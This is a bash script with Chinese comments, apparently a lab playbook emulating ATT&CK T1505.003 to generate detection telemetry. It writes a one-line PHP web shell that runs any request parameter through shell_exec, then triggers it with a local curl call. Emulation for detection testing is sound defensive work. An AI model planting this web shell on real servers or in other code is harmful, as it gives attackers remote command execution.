#!/usr/bin/env bash
# SecLab 剧本：在采集窗口内执行（collect.sh 已 cd 到工作区）。载荷无害。
set -euo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
# T1505.003：web 根写入 web shell + HTTP 触发
mkdir -p webroot
cat > webroot/shell.php <<'EOS'
<?php if (isset($_REQUEST["c"])) { echo shell_exec($_REQUEST["c"]); } ?>
EOS
( cd webroot && python3 -m http.server 18080 >/dev/null 2>&1 ) &
SRV=$!; sleep 0.5
curl -sf "http://127.0.0.1:18080/shell.php?c=id" >/dev/null || true
kill $SRV 2>/dev/null || true
